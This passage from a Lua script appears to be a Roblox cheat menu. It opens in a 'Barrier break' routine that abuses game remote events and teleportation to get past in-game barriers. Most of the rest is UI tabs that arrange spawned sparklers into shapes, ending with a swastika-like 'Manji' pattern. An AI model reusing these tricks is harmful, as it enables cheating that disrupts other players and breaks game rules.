                local ocarina = toyFolder:FindFirstChild("InstrumentWoodwindOcarina")
                if not ocarina then error("InstrumentWoodwindOcarina not found") end
                if ocarina:FindFirstChild("HoldPart") and ocarina.HoldPart:FindFirstChild("HoldItemRemoteFunction") then
                    pcall(function()
                        ocarina.HoldPart.HoldItemRemoteFunction:InvokeServer(ocarina, player.Character)
                    end)
                    task.wait(0.2)
                end
                player.Character.HumanoidRootPart.CFrame = CFrame.new(304.06, 25.77, 488.54)
                task.wait(0.05)
                local destroyEv = ReplicatedStorage:FindFirstChild("MenuToys") and ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")
                if destroyEv then
                    destroyEv:FireServer(ocarina)
                else
                    error("DestroyToy event not found")
                end
                task.wait(0.05)
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    player.Character.HumanoidRootPart.CFrame = originalCFrame
                end
                OrionLib:MakeNotification({ Name = "Success", Content = "Barrier break executed", Time = 3 })
            end)
            if humanoid then
                pcall(function()
                    if originalWalkSpeed then humanoid.WalkSpeed = originalWalkSpeed end
                    if originalJumpPower then humanoid.JumpPower = originalJumpPower end
                end)
            end
            if not success then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = tostring(err), Time = 6 })
            end
        end
    })
end

-- ============================================================================
-- Block 39: Feather Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local FeatherTab = Window:MakeTab({ Name = "Feather [Wing]", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    FeatherTab:AddToggle({ Name = "Activate Feather", Default = false, Callback = _G.toggleFeather })
    FeatherTab:AddSlider({ Name = "Max Object Count", Min = 2, Max = 100, Default = SH.FeatherConfig.maxSparklers, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.FeatherConfig.maxSparklers = v end })
    FeatherTab:AddSlider({ Name = "Object Spacing", Min = 1, Max = 20, Default = SH.FeatherConfig.spacing, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.FeatherConfig.spacing = v end })
    FeatherTab:AddSlider({ Name = "Height Offset", Min = -10, Max = 30, Default = SH.FeatherConfig.heightOffset, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.FeatherConfig.heightOffset = v end })
    FeatherTab:AddSlider({ Name = "Back Offset", Min = 0, Max = 30, Default = SH.FeatherConfig.backwardOffset, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.FeatherConfig.backwardOffset = v end })
    FeatherTab:AddSlider({ Name = "Tilt Angle", Min = 0, Max = 90, Default = SH.FeatherConfig.tiltAngle, Color = Theme.SliderColor, Increment = 5, ValueName = "deg", Callback = function(v) SH.FeatherConfig.tiltAngle = v end })
    FeatherTab:AddSlider({ Name = "Wave Speed", Min = 0, Max = 20, Default = SH.FeatherConfig.waveSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.FeatherConfig.waveSpeed = v end })
    FeatherTab:AddSlider({ Name = "Base Amplitude", Min = 0, Max = 20, Default = SH.FeatherConfig.baseAmplitude, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.FeatherConfig.baseAmplitude = v end })
end

-- ============================================================================
-- Block 40: Wing V2 Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local WingTab = Window:MakeTab({ Name = "Wing V2", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    WingTab:AddSection({ Name = "Wing V2 (FireworkSparkler Wing)" })
    WingTab:AddToggle({ Name = "Activate Wing V2", Default = false, Callback = _G.toggleWing })
    WingTab:AddSlider({ Name = "Wing Height Position", Min = -10.0, Max = 20.0, Default = SH.WingConfig.VerticalOffset, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.WingConfig.VerticalOffset = v end })
    WingTab:AddSlider({ Name = "Wing Spread", Min = 3.0, Max = 30.0, Default = SH.WingConfig.Spread, Color = Theme.SliderColor, Increment = 1.0, ValueName = "studs", Callback = function(v) SH.WingConfig.Spread = v end })
    WingTab:AddSlider({ Name = "Flap Shape", Min = 0.5, Max = 10.0, Default = SH.WingConfig.FlapShape, Color = Theme.SliderColor, Increment = 0.5, ValueName = "shape", Callback = function(v) SH.WingConfig.FlapShape = v end })
    WingTab:AddSlider({ Name = "Flap Speed", Min = 0.1, Max = 5.0, Default = SH.WingConfig.FlapSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.WingConfig.FlapSpeed = v end })
    WingTab:AddSlider({ Name = "Flap Range", Min = 0.0, Max = 100.0, Default = SH.WingConfig.FlapAmount, Color = Theme.SliderColor, Increment = 1.0, ValueName = "deg", Callback = function(v) SH.WingConfig.FlapAmount = v end })
    WingTab:AddSlider({ Name = "Objects per Wing", Min = 3, Max = 30, Default = SH.WingConfig.ObjectCount, Color = Theme.SliderColor, Increment = 1, ValueName = "pc", Callback = function(v) SH.WingConfig.ObjectCount = v end })
    WingTab:AddSlider({ Name = "Chain Delay", Min = 0.001, Max = 0.1, Default = SH.WingConfig.ChainDelay, Color = Theme.SliderColor, Increment = 0.001, ValueName = "sec", Callback = function(v) SH.WingConfig.ChainDelay = v end })
end

-- ============================================================================
-- Block 41: Saturn Sparkler Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local SH = _G.SH
    local Theme = _G.Theme

    local SaturnTab = Window:MakeTab({ Name = "Saturn Sparkler", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    SaturnTab:AddSection({ Name = "Saturn-Type Sparkler Controller" })
    SaturnTab:AddToggle({ Name = "Enable", Default = false, Callback = _G.toggleSaturn })
    SaturnTab:AddDropdown({
        Name = "Placement Mode",
        Default = "Saturn (Sphere + Ring)",
        Options = {"Saturn (Sphere + Ring)", "Sphere (3D)", "Ring (Flat)", "Plot (Ground Spread)"},
        Callback = function(Value)
            if Value == "Saturn (Sphere + Ring)" then SH.SaturnConfig.Mode = "saturn"
            elseif Value == "Sphere (3D)" then SH.SaturnConfig.Mode = "sphere"
            elseif Value == "Ring (Flat)" then SH.SaturnConfig.Mode = "ring"
            elseif Value == "Plot (Ground Spread)" then SH.SaturnConfig.Mode = "plot" end
            PlayActionSound()
        end
    })
    SaturnTab:AddSlider({ Name = "Base Height", Min = 0, Max = 20, Default = SH.SaturnConfig.BaseHeight, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.SaturnConfig.BaseHeight = v end })
    SaturnTab:AddSlider({ Name = "Follow Speed", Min = 5, Max = 40, Default = SH.SaturnConfig.Strength, Color = Theme.SliderColor, Increment = 1, ValueName = "strength", Callback = function(v) SH.SaturnConfig.Strength = v end })
    SaturnTab:AddSection({ Name = "Ring Settings" })
    SaturnTab:AddSlider({ Name = "Ring Radius", Min = 5, Max = 25, Default = SH.SaturnConfig.RingRadius, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.SaturnConfig.RingRadius = v end })
    SaturnTab:AddSlider({ Name = "Ring Speed", Min = 0.1, Max = 5, Default = SH.SaturnConfig.RingSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "x", Callback = function(v) SH.SaturnConfig.RingSpeed = v end })
    SaturnTab:AddSection({ Name = "Sphere Settings" })
    SaturnTab:AddSlider({ Name = "Sphere Radius", Min = 2, Max = 12, Default = SH.SaturnConfig.SphereRadius, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.SaturnConfig.SphereRadius = v end })
    SaturnTab:AddSlider({ Name = "Sphere Speed", Min = 0.1, Max = 20, Default = SH.SaturnConfig.SphereSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "x", Callback = function(v) SH.SaturnConfig.SphereSpeed = v end })
    SaturnTab:AddSlider({ Name = "Sphere Layer Count", Min = 3, Max = 10, Default = SH.SaturnConfig.SphereLayers, Color = Theme.SliderColor, Increment = 1, ValueName = "layers", Callback = function(v) SH.SaturnConfig.SphereLayers = v end })
    SaturnTab:AddSection({ Name = "Plot Settings" })
    SaturnTab:AddSlider({ Name = "Plot Spread Radius", Min = 5, Max = 50, Default = SH.SaturnConfig.PlotRadius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.SaturnConfig.PlotRadius = v end })
    SaturnTab:AddSlider({ Name = "Float Height", Min = 0, Max = 10, Default = SH.SaturnConfig.PlotHeight, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.SaturnConfig.PlotHeight = v end })
    SaturnTab:AddSection({ Name = "Utility" })
    SaturnTab:AddButton({ Name = "Rescan", Callback = function()
        PlayActionSound()
        if _G.rescanSaturn then
            _G.rescanSaturn()
            OrionLib:MakeNotification({ Name = "Rescan Complete", Content = string.format("Detected %d sparklers", #SH.saturnList), Time = 2 })
        end
    end })
end

-- ============================================================================
-- Block 42: Magic Circle Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local MagicCircleTab = Window:MakeTab({ Name = "Magic Circle", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    MagicCircleTab:AddToggle({ Name = "Activate Magic Circle", Default = false, Callback = _G.toggleMagicCircle })
    MagicCircleTab:AddDropdown({ Name = "Symbol Type", Default = SH.MagicCircleConfig.SymbolType, Options = {"Ring", "Circle", "Hexagram"}, Callback = function(v) SH.MagicCircleConfig.SymbolType = v; PlayActionSound() end })
    MagicCircleTab:AddToggle({ Name = "Glow Effect", Default = SH.MagicCircleConfig.GlowEffect, Callback = function(v)
        SH.MagicCircleConfig.GlowEffect = v
        if v then PlayActionSound() end
        if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false); task.wait(0.1); _G.toggleMagicCircle(true) end
    end })
    MagicCircleTab:AddSlider({ Name = "Height", Min = 0, Max = 50, Default = SH.MagicCircleConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.MagicCircleConfig.Height = v end })
    MagicCircleTab:AddSlider({ Name = "Diameter", Min = 5, Max = 50, Default = SH.MagicCircleConfig.Diameter, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.MagicCircleConfig.Diameter = v end })
    MagicCircleTab:AddSlider({ Name = "Object Count", Min = 3, Max = 100, Default = SH.MagicCircleConfig.ObjectCount, Color = Theme.SliderColor, Increment = 1, ValueName = "pc", Callback = function(v) SH.MagicCircleConfig.ObjectCount = v end })
    MagicCircleTab:AddSlider({ Name = "Rotation Speed", Min = 1, Max = 100, Default = SH.MagicCircleConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 1, ValueName = "speed", Callback = function(v) SH.MagicCircleConfig.RotationSpeed = v end })
end

-- ============================================================================
-- Block 43: Tornado Toy MOD (SuperRing) Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local SH = _G.SH
    local Theme = _G.Theme

    local SuperRingTab = Window:MakeTab({
        Name = "Tornado Toy MOD",
        Icon = "rbxassetid://4483362458",
        PremiumOnly = false
    })

    SuperRingTab:AddSection({ Name = "Basic Settings" })
    SuperRingTab:AddToggle({ Name = "Activate Tornado Toy MOD", Default = false, Callback = _G.toggleSuperRing })
    SuperRingTab:AddToggle({ Name = "Follow Player", Default = SH.SuperRingConfig.FollowPlayer, Callback = function(v)
        SH.SuperRingConfig.FollowPlayer = v
        if v then PlayActionSound() end
    end })
    SuperRingTab:AddToggle({ Name = "Tornado Effect (Spiral)", Default = SH.SuperRingConfig.TornadoEffect, Callback = function(v)
        SH.SuperRingConfig.TornadoEffect = v
        if v then PlayActionSound() end
    end })

    SuperRingTab:AddSection({ Name = "Size Settings" })
    SuperRingTab:AddSlider({ Name = "Base Radius", Min = 1, Max = 10, Default = SH.SuperRingConfig.Radius, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.SuperRingConfig.Radius = v end })
    SuperRingTab:AddSlider({ Name = "Base Height", Min = 0, Max = 10, Default = SH.SuperRingConfig.BaseHeight, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.SuperRingConfig.BaseHeight = v end })
    SuperRingTab:AddSlider({
        Name = "Total Height",
        Min = 5, Max = 30,
        Default = SH.SuperRingConfig.Height,
        Color = Theme.SliderColor,
        Increment = 1,
        ValueName = "studs",
        Callback = function(v)
            SH.SuperRingConfig.Height = v
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false); task.wait(0.1); _G.toggleSuperRing(true) end
        end
    })
    SuperRingTab:AddSlider({
        Name = "Firework Count",
        Min = 8, Max = 32,
        Default = SH.SuperRingConfig.ObjectCount,
        Color = Theme.SliderColor,
        Increment = 2,
        ValueName = "pc",
        Callback = function(v)
            SH.SuperRingConfig.ObjectCount = v
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false); task.wait(0.1); _G.toggleSuperRing(true) end
        end
    })

    SuperRingTab:AddSection({ Name = "Motion Settings" })
    SuperRingTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 5, Default = SH.SuperRingConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.SuperRingConfig.RotationSpeed = v end })
    SuperRingTab:AddSlider({ Name = "Spiral Speed", Min = 0, Max = 3, Default = SH.SuperRingConfig.SpiralSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.SuperRingConfig.SpiralSpeed = v end })
    SuperRingTab:AddSlider({ Name = "Wave Speed", Min = 0, Max = 3, Default = SH.SuperRingConfig.WaveSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.SuperRingConfig.WaveSpeed = v end })
    SuperRingTab:AddSlider({ Name = "Wave Amplitude", Min = 0, Max = 2, Default = SH.SuperRingConfig.WaveAmplitude, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.SuperRingConfig.WaveAmplitude = v end })

    SuperRingTab:AddSection({ Name = "Control" })
    SuperRingTab:AddButton({
        Name = "Redetect Fireworks",
        Callback = function()
            if SH.SuperRingConfig.Enabled then
                PlayActionSound()
                _G.toggleSuperRing(false)
                task.wait(0.1)
                _G.toggleSuperRing(true)
                OrionLib:MakeNotification({ Name = "Redetection Complete", Content = "Fireworks redetected", Time = 3 })
            else
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "Please activate first", Time = 3 })
            end
        end
    })
end

-- ============================================================================
-- Block 44: Ferris Wheel Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local FerrisWheelTab = Window:MakeTab({ Name = "Ferris Wheel", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    FerrisWheelTab:AddToggle({ Name = "Activate Ferris Wheel", Default = false, Callback = _G.toggleFerrisWheel })
    FerrisWheelTab:AddToggle({ Name = "Follow Player", Default = SH.FerrisWheelConfig.FollowPlayer, Callback = function(v) SH.FerrisWheelConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    FerrisWheelTab:AddToggle({ Name = "Vertical Circle", Default = SH.FerrisWheelConfig.VerticalCircle, Callback = function(v) SH.FerrisWheelConfig.VerticalCircle = v; if v then PlayActionSound() end end })
    FerrisWheelTab:AddToggle({ Name = "Use Fixed Direction", Default = SH.FerrisWheelConfig.FixedDirection, Callback = function(v) SH.FerrisWheelConfig.FixedDirection = v; if v then PlayActionSound() end end })
    FerrisWheelTab:AddSlider({ Name = "Fixed Yaw", Min = -180, Max = 180, Default = SH.FerrisWheelConfig.FixedYaw, Color = Theme.SliderColor, Increment = 5, ValueName = "deg", Callback = function(v) SH.FerrisWheelConfig.FixedYaw = v end })
    FerrisWheelTab:AddSlider({ Name = "Fixed Pitch", Min = -90, Max = 90, Default = SH.FerrisWheelConfig.FixedPitch, Color = Theme.SliderColor, Increment = 5, ValueName = "deg", Callback = function(v) SH.FerrisWheelConfig.FixedPitch = v end })
    FerrisWheelTab:AddSlider({ Name = "Fixed Roll", Min = -180, Max = 180, Default = SH.FerrisWheelConfig.FixedRoll, Color = Theme.SliderColor, Increment = 5, ValueName = "deg", Callback = function(v) SH.FerrisWheelConfig.FixedRoll = v end })
    FerrisWheelTab:AddSlider({ Name = "Radius", Min = 5, Max = 50, Default = SH.FerrisWheelConfig.Radius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.FerrisWheelConfig.Radius = v end })
    FerrisWheelTab:AddSlider({ Name = "Center Height", Min = 5, Max = 50, Default = SH.FerrisWheelConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.FerrisWheelConfig.Height = v end })
    FerrisWheelTab:AddSlider({ Name = "Object Count", Min = 6, Max = 100, Default = SH.FerrisWheelConfig.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.FerrisWheelConfig.ObjectCount = v end })
    FerrisWheelTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 5, Default = SH.FerrisWheelConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.FerrisWheelConfig.RotationSpeed = v end })
end

-- ============================================================================
-- Block 45: ♡Heart// Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local HeartTab = Window:MakeTab({ Name = "♡Heart//", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    HeartTab:AddToggle({ Name = "Activate Heart", Default = false, Callback = _G.toggleHeart })
    HeartTab:AddToggle({ Name = "Follow Player", Default = SH.HeartConfig.FollowPlayer, Callback = function(v) SH.HeartConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    HeartTab:AddSlider({ Name = "Heart Size", Min = 2, Max = 50, Default = SH.HeartConfig.Size, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.HeartConfig.Size = v end })
    HeartTab:AddSlider({ Name = "Base Height", Min = 0, Max = 50, Default = SH.HeartConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.HeartConfig.Height = v end })
    HeartTab:AddSlider({ Name = "Object Count", Min = 6, Max = 100, Default = SH.HeartConfig.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.HeartConfig.ObjectCount = v end })
    HeartTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 10, Default = SH.HeartConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.HeartConfig.RotationSpeed = v end })
    HeartTab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = 10, Default = SH.HeartConfig.PulseSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.HeartConfig.PulseSpeed = v end })
    HeartTab:AddSlider({ Name = "Pulse Amplitude", Min = 0, Max = 10, Default = SH.HeartConfig.PulseAmplitude, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.HeartConfig.PulseAmplitude = v end })
end

-- ============================================================================
-- Block 46: Vertical Heart// Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local VerticalHeartTab = Window:MakeTab({ Name = "Vertical Heart//", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    VerticalHeartTab:AddToggle({ Name = "Activate Vertical Heart", Default = false, Callback = _G.toggleVerticalHeart })
    VerticalHeartTab:AddToggle({ Name = "Follow Player", Default = SH.VerticalHeartConfig.FollowPlayer, Callback = function(v) SH.VerticalHeartConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    VerticalHeartTab:AddSlider({ Name = "Heart Size", Min = 2, Max = 50, Default = SH.VerticalHeartConfig.Size, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.VerticalHeartConfig.Size = v end })
    VerticalHeartTab:AddSlider({ Name = "Base Height", Min = 0, Max = 50, Default = SH.VerticalHeartConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.VerticalHeartConfig.Height = v end })
    VerticalHeartTab:AddSlider({ Name = "Object Count", Min = 6, Max = 100, Default = SH.VerticalHeartConfig.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.VerticalHeartConfig.ObjectCount = v end })
    VerticalHeartTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 10, Default = SH.VerticalHeartConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.VerticalHeartConfig.RotationSpeed = v end })
    VerticalHeartTab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = 10, Default = SH.VerticalHeartConfig.PulseSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.VerticalHeartConfig.PulseSpeed = v end })
    VerticalHeartTab:AddSlider({ Name = "Pulse Amplitude", Min = 0, Max = 10, Default = SH.VerticalHeartConfig.PulseAmplitude, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.VerticalHeartConfig.PulseAmplitude = v end })
end

-- ============================================================================
-- Block 47: Big♡ Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local BigHeartTab = Window:MakeTab({ Name = "Big♡", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    BigHeartTab:AddToggle({ Name = "Activate Big Heart", Default = false, Callback = _G.toggleBigHeart })
    BigHeartTab:AddToggle({ Name = "Follow Player", Default = SH.BigHeartConfig.FollowPlayer, Callback = function(v) SH.BigHeartConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    BigHeartTab:AddSlider({ Name = "Base Size", Min = 5, Max = 50, Default = SH.BigHeartConfig.Size, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.BigHeartConfig.Size = v end })
    BigHeartTab:AddSlider({ Name = "Scale Factor", Min = 1.0, Max = 10.0, Default = SH.BigHeartConfig.HeartScale, Color = Theme.SliderColor, Increment = 0.1, ValueName = "x", Callback = function(v) SH.BigHeartConfig.HeartScale = v end })
    BigHeartTab:AddSlider({ Name = "Vertical Stretch", Min = 1.0, Max = 5.0, Default = SH.BigHeartConfig.VerticalStretch, Color = Theme.SliderColor, Increment = 0.1, ValueName = "x", Callback = function(v) SH.BigHeartConfig.VerticalStretch = v end })
    BigHeartTab:AddSlider({ Name = "Base Height", Min = 5, Max = 50, Default = SH.BigHeartConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.BigHeartConfig.Height = v end })
    BigHeartTab:AddSlider({ Name = "Object Count", Min = 12, Max = 100, Default = SH.BigHeartConfig.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.BigHeartConfig.ObjectCount = v end })
    BigHeartTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = SH.BigHeartConfig.RotationSpeedMax, Default = SH.BigHeartConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.BigHeartConfig.RotationSpeed = v end })
    BigHeartTab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = SH.BigHeartConfig.PulseSpeedMax, Default = SH.BigHeartConfig.PulseSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.BigHeartConfig.PulseSpeed = v end })
    BigHeartTab:AddSlider({ Name = "Pulse Amplitude", Min = 0, Max = 10, Default = SH.BigHeartConfig.PulseAmplitude, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.BigHeartConfig.PulseAmplitude = v end })
end

-- ============================================================================
-- Block 48: Vertical Big♡ Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local VerticalBigHeartTab = Window:MakeTab({ Name = "Vertical Big♡", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    VerticalBigHeartTab:AddToggle({ Name = "Activate Vertical Big♡", Default = false, Callback = _G.toggleVerticalBigHeart })
    VerticalBigHeartTab:AddToggle({ Name = "Follow Player", Default = SH.VerticalBigHeartConfig.FollowPlayer, Callback = function(v) SH.VerticalBigHeartConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    VerticalBigHeartTab:AddSlider({ Name = "Base Size", Min = 5, Max = 50, Default = SH.VerticalBigHeartConfig.Size, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.VerticalBigHeartConfig.Size = v end })
    VerticalBigHeartTab:AddSlider({ Name = "Scale Factor", Min = 1.0, Max = 10.0, Default = SH.VerticalBigHeartConfig.HeartScale, Color = Theme.SliderColor, Increment = 0.1, ValueName = "x", Callback = function(v) SH.VerticalBigHeartConfig.HeartScale = v end })
    VerticalBigHeartTab:AddSlider({ Name = "Base Height", Min = 5, Max = 50, Default = SH.VerticalBigHeartConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.VerticalBigHeartConfig.Height = v end })
    VerticalBigHeartTab:AddSlider({ Name = "Object Count", Min = 12, Max = 100, Default = SH.VerticalBigHeartConfig.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.VerticalBigHeartConfig.ObjectCount = v end })
    VerticalBigHeartTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = SH.VerticalBigHeartConfig.RotationSpeedMax, Default = SH.VerticalBigHeartConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.VerticalBigHeartConfig.RotationSpeed = v end })
    VerticalBigHeartTab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = SH.VerticalBigHeartConfig.PulseSpeedMax, Default = SH.VerticalBigHeartConfig.PulseSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.VerticalBigHeartConfig.PulseSpeed = v end })
    VerticalBigHeartTab:AddSlider({ Name = "Pulse Amplitude", Min = 0, Max = 10, Default = SH.VerticalBigHeartConfig.PulseAmplitude, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.VerticalBigHeartConfig.PulseAmplitude = v end })
end

-- ============================================================================
-- Block 49: Manji (卍) Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local LocalPlayer = _G.LocalPlayer
    local Workspace = _G.Workspace

    local ManjiTab = Window:MakeTab({ Name = "卍 (Manji)", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    ManjiTab:AddSection({ Name = "Control" })

    local isRunning = false
    local loopTask = nil
    local sparklers = {}
    local size = 3
    local speed = 0.3
    local step1 = 0
    local step2 = 0
    local dir1 = 1
    local dir2 = 1

    local function GetSparklers()
        local result = {}
        local folder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
        if not folder then return result end
        for _, v in pairs(folder:GetChildren()) do
            if v:IsA("Model") and v.Name == "FireworkSparkler" then
                local base = v:FindFirstChild("Base")
                if base then table.insert(result, base) end
            end
        end
        return result
    end

    local function GetHalfManji(step, size)
        size = size or 3
        local points = {
            {x = -1, z = -1}, {x = -0.8, z = -1}, {x = -0.6, z = -1}, {x = -0.4, z = -1},
            {x = -0.2, z = -1}, {x = 0, z = -1},
            {x = 0, z = -0.8}, {x = 0, z = -0.6}, {x = 0, z = -0.4}, {x = 0, z = -0.2},
            {x = 0, z = 0}, {x = 0, z = 0.2}, {x = 0, z = 0.4}, {x = 0, z = 0.6},
            {x = 0, z = 0.8}, {x = 0, z = 1},
            {x = 0.2, z = 1}, {x = 0.4, z = 1}, {x = 0.6, z = 1}, {x = 0.8, z = 1},
            {x = 1, z = 1},
        }
        local idx = math.floor(step) % #points + 1
        local p = points[idx]
        return Vector3.new(p.x * size, 0, p.z * size)
    end

    local function GetHalfManjiRotated(step, size)
        size = size or 3
        local points = {
            {x = -1, z = 1}, {x = -1, z = 0.8}, {x = -1, z = 0.6}, {x = -1, z = 0.4},
            {x = -1, z = 0.2}, {x = -1, z = 0},
            {x = -0.8, z = 0}, {x = -0.6, z = 0}, {x = -0.4, z = 0}, {x = -0.2, z = 0},
            {x = 0, z = 0}, {x = 0.2, z = 0}, {x = 0.4, z = 0}, {x = 0.6, z = 0},
            {x = 0.8, z = 0}, {x = 1, z = 0},
            {x = 1, z = -0.2}, {x = 1, z = -0.4}, {x = 1, z = -0.6}, {x = 1, z = -0.8},
            {x = 1, z = -1},
        }
        local idx = math.floor(step) % #points + 1
        local p = points[idx]
        return Vector3.new(p.x * size, 0, p.z * size)
    end

    local function StartManjiLoop()
        if isRunning then return end
        sparklers = GetSparklers()
        if #sparklers < 2 then
            PlayErrorSound()
            OrionLib:MakeNotification({ Name = "Error", Content = "At least 2 sparklers required", Time = 3 })
            return
        end
        isRunning = true
        PlayActionSound()
        OrionLib:MakeNotification({ Name = "卍", Content = "Start (Both directions)", Time = 2 })
        loopTask = task.spawn(function()
            local total = 20
            while isRunning do
                local char = LocalPlayer.Character
                if char then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if root then
                        local centerPos = root.Position + Vector3.new(0, 5, 0)
                        step1 = step1 + speed * dir1
                        if step1 >= total then step1 = total; dir1 = -1
                        elseif step1 <= 0 then step1 = 0; dir1 = 1 end
                        step2 = step2 + speed * dir2
                        if step2 >= total then step2 = total; dir2 = -1
                        elseif step2 <= 0 then step2 = 0; dir2 = 1 end
                        local p1 = sparklers[1]
                        if p1 and p1.Parent then
